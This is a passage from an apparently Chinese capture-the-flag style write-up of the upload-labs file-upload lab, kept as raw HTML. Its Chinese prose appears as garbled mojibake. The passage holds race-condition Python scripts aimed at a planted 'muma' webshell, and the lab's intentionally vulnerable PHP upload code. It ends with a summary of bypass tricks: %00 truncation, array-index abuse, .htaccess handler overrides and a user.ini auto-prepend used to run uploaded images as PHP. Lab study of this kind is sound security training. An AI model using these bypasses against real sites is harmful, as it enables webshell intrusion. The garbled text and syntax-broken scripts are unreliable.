class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=http://<span class="number">192.168</span><span class="number">.32</span><span class="number">.1</span>/upload-labs/upload/<span class="number">2.</span>php</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span></span><br><span class="line">    html=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure><br><img src="/2023/12/15/upload-labs/18-1.png" class="" title="Alt text"><br><img src="/2023/12/15/upload-labs/18-2.png" class="" title="aa"><br>å†è¿›è¡Œå‘åŒ…åŒæ—¶æ‰“å¼€è„šæœ¬ï¼Œå¯ä»¥å‘ç°å†æ–‡ä»¶å¤¹ä¸‹æˆåŠŸå‡ºç°äº†muma.php<br><img src="/2023/12/15/upload-labs/18-3.png" class="" title="Alt text"></p><h1 id="poss-19"><a href="#poss-19" class="headerlink" title="poss-19"></a>poss-19</h1><p>è¿™é“é¢˜ç›®æˆ‘ä»¬è¿›è¡Œä»£ç å®¡æŸ¥ï¼Œå‘ç°è¿™é“é¢˜ç›®çš„ä¸»è¦æ­¥éª¤ä¸ºï¼Œæ£€æŸ¥åç¼€ï¼Œä¿å­˜æ–‡ä»¶ï¼Œé‡å‘½åæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™é“é¢˜ç›®ä¹Ÿå¯ä»¥ä½¿ç”¨æ¡ä»¶ç«äº‰åšæ³•ä¸ä¸Šé¢˜ç›¸ä¼¼åªæ˜¯è„šæœ¬æœ‰äº›è®¸ä¸åŒ</p><h1 id="æ³•ä¸€æ¡ä»¶ç«äº‰"><a href="#æ³•ä¸€æ¡ä»¶ç«äº‰" class="headerlink" title="æ³•ä¸€æ¡ä»¶ç«äº‰"></a>æ³•ä¸€æ¡ä»¶ç«äº‰</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.32.1/upload-labs/include.php?file=upload/muma.jpg&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span></span><br><span class="line">    html=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;warning&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(html.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="poss-20"><a href="#poss-20" class="headerlink" title="poss-20"></a>poss-20</h1><p>pathinfo(path,options):<br>ä½œç”¨ï¼šä»¥æ•°ç»„çš„å½¢å¼è¿”å›æ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯ã€‚<br>è¯­æ³•ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">path  å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„è·¯å¾„ã€‚</span><br><span class="line">process_sections  å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„æ•°ç»„å…ƒç´ ã€‚é»˜è®¤æ˜¯ allã€‚</span><br><span class="line">å¯èƒ½çš„å€¼ï¼š</span><br><span class="line">PATHINFO_DIRNAME - åªè¿”å› dirnameï¼ˆæ‰€åœ¨è·¯å¾„ï¼‰</span><br><span class="line">PATHINFO_BASENAME - åªè¿”å› basenameï¼ˆæ–‡ä»¶åï¼‰</span><br><span class="line">PATHINFO_EXTENSION - åªè¿”å› extensionï¼ˆåç¼€åï¼‰</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥POSTæ–¹æ³•æ§åˆ¶æ–‡ä»¶åå­—ã€‚<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¿å­˜çš„å‡½æ•°move_uploaded_file()è¿™ä¸ªå‡½æ•°å¯ä»¥ä½¿ç”¨%00æˆªæ–­ç»•è¿‡ï¼Œè¿˜ä¼šå¿½ç•¥æ–‡ä»¶å°¾éƒ¨çš„/.æˆ‘ä»¬å¯ä»¥å†æ–‡ä»¶å°¾å·´ä¸Šä¼ åç¼€ä¸ºphp/.æˆ–php%00æ¥ç»•è¿‡</p><h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//æ£€æŸ¥MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//æ£€æŸ¥æ–‡ä»¶å</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$_FILES[â€˜upload_fileâ€™]<br>name: ä¸Šä¼ æ–‡ä»¶çš„åç§°ï¼Œå³ç”¨æˆ·åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šé€‰æ‹©çš„æ–‡ä»¶åã€‚<br>type: ä¸Šä¼ æ–‡ä»¶çš„ MIME ç±»å‹ã€‚<br>tmp_name: ä¸Šä¼ æ–‡ä»¶è¢«å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šçš„ä¸´æ—¶æ–‡ä»¶åã€‚<br>error: ä¸Šä¼ è¿‡ç¨‹ä¸­çš„é”™è¯¯ç ã€‚<br>size: ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚<br>empty()æ£€æŸ¥æ˜¯å¦ä¸ºç©ºä¸ºç©ºè¿”å›True<br>expload()å°†å­—ç¬¦ä¸²ä»¥ç‰¹å®šå­—ç¬¦åˆ†å‰²æˆå¤šä¸ªæ•°ç»„ã€‚å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>))</span><br></pre></td></tr></table></figure><br>å°†<code>$file</code>è½¬ä¸ºå°å†™åä»¥.ä¸ºåˆ†éš”ç¬¦æ¥å°†å­—ç¬¦ä¸²åˆ†å‰²ä¿å­˜å†æ•°ç»„ä¸­ï¼Œè‹¥<code>$file=llll.SSS.ee</code><br>ä¼šå˜ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$name[0]=&gt;llll</span><br><span class="line">$name[1]=&gt;sss</span><br><span class="line">$name[2]=&gt;ee</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br></pre></td></tr></table></figure><br> è¿™æ®µä»£ç æˆ‘ä»¬éƒ½å¯ä»¥çœ‹å‡ºæ¥ï¼Œæ˜¯å¯¹fileå˜é‡è¿›è¡Œèµ‹å€¼ï¼Œåˆ©ç”¨äº†ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¦‚æœæœ‰ä½¿ç”¨POSTå‘save_nameä¼ å€¼é‚£ä¹ˆfileå°±ä¼šè¢«èµ‹å€¼ä¸º$_POST[â€˜save_nameâ€™]ã€‚<br> ä¹‹åå°†è¯¥å­—ç¬¦ä¸²åˆ†å‰²ä¸ºæ•°ç»„ï¼Œä¹‹åè¿›è¡Œäº†ä¸€æ¬¡åˆ¤æ–­ï¼Œæ•°ç»„æœ€åçš„ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨ç™½åå•é‡Œèƒ½å¯»æ‰¾åˆ°ï¼Œæœ€åå°†æ–‡ä»¶ä¿å­˜ï¼Œæˆ‘ä»¬é‡ç‚¹åˆ†æä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">$img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br></pre></td></tr></table></figure><br>  è¯¥ä»£ç å°†file_nameä¸UPLOAD_PATHè¿›è¡Œæ‹¼æ¥æˆäº†æ–‡ä»¶ä¸Šä¼ è·¯å¾„ï¼Œfile_nameçš„å‘½åæ˜¯å°†fileæ•°ç»„çš„ç¬¬ä¸€ä¸ªä¸ä»¥æ•°é‡å‡ä¸€ä¸ºä¸‹æ ‡çš„æ•°ç»„å…ƒç´ è¿›è¡Œæ‹¼æ¥ã€‚<br>  é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†POSTä¸Šä¼ çš„å†…å®¹æ”¹ä¸ºæ•°ç»„ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡expload()å‡½æ•°é‚£ä¹ˆæˆ‘ä»¬åªè¦ä¸Šä¼ ä¸€ä¸ªæœ‰ä¸¤å…ƒç´ ï¼Œç¬¬äºŒä¸ªä¸‹æ ‡ä¸º2çš„æ•°ç»„ï¼Œé‚£ä¹ˆè¿™å°±ä¼šå¯¼è‡´åœ¨<code>end($file)</code>æ—¶è¿”å›çš„æ—¶file[2]ä½†æ˜¯<code>$file[count($file) - 1]</code>çš„è¿”å›å€¼ä¸ºfile[1]äºŒè¿™ä¸ªå…ƒç´ æˆ‘ä»¬æ²¡æœ‰ä¸Šä¼ ï¼Œé‚£ä¹ˆè¯¥å€¼å°±ä¸ºç©ºï¼Œé‚£ä¹ˆfile_nameå°±å˜ä¸ºäº†<code>reset($file)</code>ä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±ä¸‹æ ‡ä¸º0çš„å…ƒç´ <br>  <img src="/2023/12/15/upload-labs/21-1.png" class="" title="Alt text"><br>  æˆ‘ä»¬åªè¦ä½¿ç”¨bpæŠ“åŒ…ä¼ å…¥æ•°ç»„ï¼Œå…ƒç´ æœ‰ä¸¤ä¸ªæ²¡æœ‰ä¸‹æ ‡1ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸç»•è¿‡ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>  è¿™ä¸ªé¶åœºä¹Ÿå·²ç»åˆ·å®Œäº†ï¼Œè¿™ä¸ªé¶åœºç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯ï¼Œä»£å®¡ï¼Œä»£å®¡ï¼Œè¿˜æ˜¯tmçš„ä»£å®¡ã€‚<br>  åœ¨åˆ·è¿™ä¸ªé¶åœºçš„æ—¶å€™æœ‰ä¸€å¤§å †ä¸è®¤è¯†çš„å‡½æ•°ï¼Œè€Œä¸”æ‰€æœ‰æ¼æ´åŸºæœ¬æ˜¯ä»£å®¡å‡ºæ¥çš„ã€‚åœ¨åˆ·å®Œè¿™ä¸ªé¶åœºåæ„Ÿè§‰è‡ªå·±ä»£å®¡èƒ½äº†å¾—åˆ°äº†æé«˜ã€‚ä¹Ÿè®¤è¯†äº†å¾ˆå¤šç»•è¿‡çš„æ–¹æ³•ä¸‹é¢æ˜¯æ€»ç»“</p><h2 id="ä¸€èˆ¬è¿‡æ»¤å‡½æ•°"><a href="#ä¸€èˆ¬è¿‡æ»¤å‡½æ•°" class="headerlink" title="ä¸€èˆ¬è¿‡æ»¤å‡½æ•°"></a>ä¸€èˆ¬è¿‡æ»¤å‡½æ•°</h2>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  åç«¯è¿‡æ»¤ä¸€èˆ¬ç”¨åˆ°çš„å‡½æ•°:</span><br><span class="line">trim()å»é™¤å­—ç¬¦ä¸²ä¸¤è¾¹çš„ç©ºæ ¼ </span><br><span class="line">deldot()åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹å· </span><br><span class="line">strrchr()åå‘æˆªå–å­—ç¬¦ä¸² </span><br><span class="line">strtolower()è½¬åŒ–ä¸ºå°å†™  </span><br><span class="line">str_ireplace()æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„å†…å®¹ </span><br><span class="line">substr()è·å–å­å­—ç¬¦ä¸² </span><br><span class="line">strrpos()è·å–å­—ç¬¦ä¸²çš„ä½ç½®ä¿¡æ¯</span><br><span class="line">fopen()æ‰“å¼€æ–‡ä»¶ </span><br><span class="line">fread()è¯»å–æ–‡ä»¶ </span><br><span class="line">unpack()å‡½æ•°ä»äºŒè¿›åˆ¶å­—ç¬¦ä¸²å¯¹æ•°æ®è¿›è¡Œè§£åŒ…</span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h2><p>  1.å‰ç«¯ç»•è¿‡ä¹Ÿæ˜¯æœ€ç®€å•çš„ç»•è¿‡ï¼Œä¸€èˆ¬åªè¦ç¦ç”¨å‰ç«¯ä»£ç ï¼Œå’Œä½¿ç”¨bpæŠ“åŒ…ä¾¿å¯ä»¥ç»•è¿‡<br>  2.MIMEç»•è¿‡ï¼ŒMIMEåœ¨å‘åç«¯å‘é€æ–‡ä»¶ç±»å‹çš„æ–¹å¼æ˜¯ï¼Œä½¿ç”¨å“åº”å¤´Content-typeæ‰€ä»¥å¯ä»¥ä½¿ç”¨bpæŠ“åŒ…ç›´æ¥ä¿®æ”¹è¯¥è¯·æ±‚å¤´çš„å†…å®¹<br>  3.%00æˆªæ–­ç»•è¿‡ï¼Œåœ¨æˆ‘ä»¬å¯ä»¥æ“æ§ä¸Šä¼ è·¯å¾„çš„æ—¶å€™å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼ŒåŸç†ä¸ºåœ¨ä¸Šä¼ æ—¶å°†åé¢çš„è·¯å¾„æˆªæ–­ã€‚è‹¥å¯ä»¥ä¼ å€¼ä¸ºPOSTä¼ å€¼éœ€è¦å°†%00ä½¿ç”¨urlè§£ç <br>  4.å¤§å†™ç»•è¿‡ï¼Œåœ¨æ²¡æœ‰å°†åç¼€å¤§å†™è½¬æ¢æˆå°å­¦è¿™ä¸ªæ“ä½œä¸”åŒ¹é…å‡½æ•°ä¸å¯ä»¥è¿›è¡Œå¯¹å¤§å°å†™ä¸æ•æ„Ÿçš„åŒ¹é…æ—¶ä½¿ç”¨ï¼Œå¦‚åœ¨é‡åˆ°in_arrayå‡½æ•°æ—¶ç”±äºè¯¥å‡½æ•°æ˜¯ç›´æ¥åŒ¹é…æ˜¯å¦åœ¨æ•°ç»„å†…å¯¼è‡´å…¶æ— æ³•åŒºåˆ†å¤§å°å†™ã€‚<br>  5.åŒå†™ç»•è¿‡ï¼Œå¦‚æœè¿‡æ»¤å‡½æ•°ä¸ºæ›¿æ¢å‡½æ•°å¦‚ireplaceè¿™ç§å‡½æ•°ï¼Œä¸”å°†å…³é”®å­—è½¬æ¢ä¸ºç©ºæ—¶å¯ä»¥ä½¿ç”¨åŒå†™è¿›è¡Œç»•è¿‡ï¼ŒåŸºæœ¬åŸç†ä¸sqlæ³¨å…¥æ—¶åŒå†™ç»•è¿‡ç›¸ä¼¼<br>  6.ç‚¹ç©ºæ ¼ç»•è¿‡ï¼Œå½“åˆ é™¤.å’Œç©ºæ ¼çš„å‡½æ•°åªä¼šè¿›è¡Œä¸€æ¬¡æ£€æµ‹æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç‚¹ç©ºæ ¼ç»•è¿‡åœ¨åç¼€çš„åé¢åŠ å…¥<code>. .</code>ä¼šå› ä¸ºï¼Œæ²¡æœ‰å®Œå…¨åˆ é™¤<code>.</code>å¯¼è‡´å…¶æ— æ³•æˆªåˆ°çœŸæ­£çš„åç¼€ä½¿å…¶ç»•è¿‡<br>  7.ç‚¹ç»•è¿‡ï¼Œç©ºæ ¼ç»•è¿‡å½“è¿‡æ»¤æ—¶ç¼ºå°‘åˆ é™¤ç‚¹å’Œç©ºæ ¼çš„å‡½æ•°æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥ç»•è¿‡ã€‚<br>  8.å½“è¿‡æ»¤ååˆ†å®Œå–„æ— æ³•ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ä½†æ˜¯å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–‡ä»¶åŒ…å«å›¾ç‰‡é©¬æ¥è·å–shell<br>  9.äºŒæ¬¡æ¸²æŸ“ä½¿ç”¨gifå›¾ç‰‡æ¥ç»•è¿‡ï¼Œç»•è¿‡å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥å°è¯•æ¡ä»¶ç«äº‰ï¼Œåœ¨ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ¥åŒ…å«å›¾ç‰‡é©¬æ¥æ¤å…¥php<br>  10.æ¡ä»¶ç«äº‰,ç”±äºæ–‡ä»¶åœ¨ä¸Šä¼ åè¢«çŸ­æš‚ä¿å­˜åæ‰è¿›è¡ŒéªŒè¯åˆ é™¤ï¼Œä¸”æ²¡æœ‰é”å¯¼è‡´å¯ä»¥ä½¿ç”¨æ¡ä»¶ç«äº‰<br>  11.<code>.htaccessæ–‡ä»¶å’Œuser.ini</code>è¿™ä¸¤ä¸ªæ–‡ä»¶å¯ä»¥é…ç½®phpçš„ä¸€äº›é…ç½®å¯¼è‡´æˆ‘ä»¬ä¸Šä¼ çš„jpgæ–‡ä»¶å¯ä»¥è¢«å½“æˆphpæ–‡ä»¶æ‰§è¡Œä»£ç å¦‚ä¸‹</p><p>  å°†jpgæ–‡ä»¶å½“æˆphpæ–‡ä»¶æ‰§è¡Œ<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><br>  å°†æ–‡ä»¶åå«æœ‰phpçš„æ–‡ä»¶å½“æˆphpæ–‡ä»¶æ‰§è¡Œ<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script php</span><br></pre></td></tr></table></figure><br>  æŒ‡å®šåç§°çš„ç”¨phpä»£ç æ‰§è¡Œ<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  &lt;FilesMatch &quot;muam&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><br>ä¸‹é¢æ—¶user.iniæ–‡ä»¶çš„<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepand_file=muma.jpg</span><br></pre></td></tr></table></figure><br>ä½œç”¨æ˜¯å°†muma.jpgæ–‡ä»¶å†™çš„å†…å®¹åŠ åˆ°æ‰€ä»¥phpæ–‡ä»¶ä¸‹ã€‚<br>13ï¼Œ<code>$::DATA</code>ç»•è¿‡ç”±äºwindowsä¼šè‡ªåŠ¨çœç•¥è¯¥å­—ç¬¦ä¸²æ‰€ä»¥åœ¨ä¸Šä¼ 